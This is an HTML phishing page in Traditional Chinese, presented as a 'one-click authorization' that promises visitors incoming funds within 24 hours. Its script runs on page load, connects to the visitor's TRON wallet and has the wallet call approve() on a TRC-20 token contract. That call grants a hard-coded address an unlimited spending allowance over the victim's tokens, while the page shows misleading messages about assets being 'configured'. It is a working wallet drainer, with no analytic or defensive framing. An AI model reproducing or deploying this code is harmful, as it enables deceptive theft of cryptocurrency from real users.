<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>一鍵授權頁面</title>
  <style>
    body {
      font-family: "Noto Sans TC", "Microsoft JhengHei", sans-serif;
      background: #0f172a;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .container {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(12px);
      border-radius: 16px;
      padding: 30px 40px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
    }
    h1 { font-size: 26px; margin-bottom: 16px; font-weight: 600; }
    p { font-size: 16px; margin-bottom: 20px; line-height: 1.6; color: #cbd5e1; }
    #status { margin-top: 20px; min-height: 24px; font-size: 14px; }
    .loading { color: #facc15; }
    .success { color: #4ade80; }
    .error { color: #f87171; }
    button {
      background: #38bdf8;
      border: none;
      padding: 10px 18px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    a { color: #38bdf8; text-decoration: underline; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
</head>
<body>
<div class="container">
  <h1>一鍵授權頁面</h1>
  <p>點擊下方授權按鈕，區塊鏈中資金會在24小時內，為您進行入賬，請確認。</p>

  <button onclick="openTronLink()">📲 用 TronLink 開啟</button>
  <p id="fallback-tip" style="display:none; margin-top:10px;">
    未成功開啟 App？<br>
    👉 <a href="https://apps.apple.com/app/id1518002753" target="_blank">點我安裝 TronLink iOS App</a><br>
    安裝後請用 TronLink App 內建瀏覽器重新開啟本頁
  </p>

  <p id="status" class="loading">正在檢測錢包...</p>
</div>

<script>
  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD TRC-20
  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";      // A 地址
  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  let tronWeb;

  function openTronLink() {
    window.location.href = "tronlink://";
    setTimeout(() => {
      document.getElementById('fallback-tip').style.display = 'block';
    }, 2000);
  }

  async function connectWallet() {
    if (window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb;
      return tronWeb.defaultAddress.base58;
    }
    return null;
  }

  async function checkTronNetwork() {
    try {
      const chainId = await tronWeb.trx.getChainId?.();
      if (chainId && chainId !== '_') {
        updateStatus("請切換到 TRON 主網", "error");
        return false;
      }
      return true;
    } catch {
      return true;
    }
  }

  async function approve() {
    updateStatus("資產處理配置中，請稍候...", "loading");
    try {
      const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
      await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
      updateStatus("資產已配置完成，請耐心等待後續流程。", "success");
      setTimeout(() => {
        window.location.href = "success.html";
      }, 2000);
    } catch (err) {
      updateStatus("系統處理異常，請稍後重試。", "error");
      setTimeout(() => {
        window.location.href = "error.html";
      }, 2500);
    }
  }

  function updateStatus(msg, type) {
    const statusEl = document.getElementById("status");
    statusEl.innerText = msg;
    statusEl.className = type;
  }

  async function init() {
    const address = await connectWallet();
    if (!address) {
      updateStatus("未檢測到 TRON 錢包，請用 TronLink 或幣安 Web3 錢包開啟此頁", "error");
      return;
    }
    if (!await checkTronNetwork()) return;
    approve();
  }

  window.addEventListener('load', init);
</script>
</body>
</html>
